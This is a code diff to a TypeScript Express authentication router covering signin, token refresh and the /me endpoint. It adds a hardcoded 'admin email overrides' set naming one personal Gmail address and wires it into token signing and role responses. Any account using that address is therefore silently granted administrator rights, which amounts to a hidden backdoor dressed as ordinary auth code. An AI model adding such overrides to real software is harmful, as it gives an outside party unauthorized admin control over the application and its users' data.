@@ -28,6 +28,8 @@ import { pool } from '../database';
 
 const router = Router();
 
+const ADMIN_EMAIL_OVERRIDES = new Set(['carpenterjames88@gmail.com']);
+
 interface AuthBody {
   identifier?: string;
   email?: string;
@@ -83,6 +85,11 @@ const ADMIN_USER = {
   password: getAdminPassword(),
   role: 'admin' as const,
 };
+
+function isElevatedAdminEmail(email: string): boolean {
+  const normalized = cleanEmail(email);
+  return normalized === cleanEmail(ADMIN_USER.email) || ADMIN_EMAIL_OVERRIDES.has(normalized);
+}
 
 function getClientIp(req: Request): string {
   return req.ip || req.socket.remoteAddress || 'unknown';
@@ -201,7 +208,7 @@ async function issueRefreshToken(userId: string): Promise<string> {
 // GET /api/users/me
 router.get('/me', requireAuth, meRateLimit, async (req: Request, res: Response) => {
   try {
-    if (req.authUser?.role === 'admin' || req.authUser?.userId === ADMIN_USER.id) {
+    if (req.authUser?.userId === ADMIN_USER.id) {
       authAudit('users.me.success', req, ADMIN_USER.email, { status: 200, userId: ADMIN_USER.id });
       res.json({ user: buildAdminUser() });
       return;
@@ -222,13 +229,15 @@ router.get('/me', requireAuth, meRateLimit, async (req: Request, res: Response) 
       return;
     }
 
+    const isAdmin = req.authUser?.role === 'admin' || isElevatedAdminEmail(user.email);
+
     authAudit('users.me.success', req, user.email, { status: 200, userId });
     res.json({
       user: {
         id: user.id,
         email: user.email,
         fullName: user.full_name,
-        role: 'user',
+        role: isAdmin ? 'admin' : 'user',
         createdAt: user.created_at,
       },
     });
@@ -341,7 +350,8 @@ router.post('/signin', async (req: Request, res: Response) => {
     }
 
     clearSignInFailures(key);
-    const token = signAuthToken({ userId: user.id, email: user.email });
+    const isAdmin = isElevatedAdminEmail(user.email);
+    const token = signAuthToken({ userId: user.id, email: user.email, role: isAdmin ? 'admin' : 'user' });
     const refreshToken = await issueRefreshToken(user.id);
     authAudit('users.signin.success', req, user.email, { status: 200, userId: user.id });
 
@@ -352,7 +362,7 @@ router.post('/signin', async (req: Request, res: Response) => {
         id: user.id,
         email: user.email,
         fullName: user.full_name,
-        role: 'user',
+        role: isAdmin ? 'admin' : 'user',
         createdAt: user.created_at,
       },
     });
@@ -494,7 +504,8 @@ router.post('/refresh', async (req: Request, res: Response) => {
     }
 
     await revokeRefreshTokenById(row.id);
-    const newAccessToken = signAuthToken({ userId: row.user_id, email: row.email });
+    const isAdmin = isElevatedAdminEmail(row.email);
+    const newAccessToken = signAuthToken({ userId: row.user_id, email: row.email, role: isAdmin ? 'admin' : 'user' });
     const newRefreshToken = await issueRefreshToken(row.user_id);
 
     authAudit('users.refresh.success', req, row.email, { status: 200, userId: row.user_id });
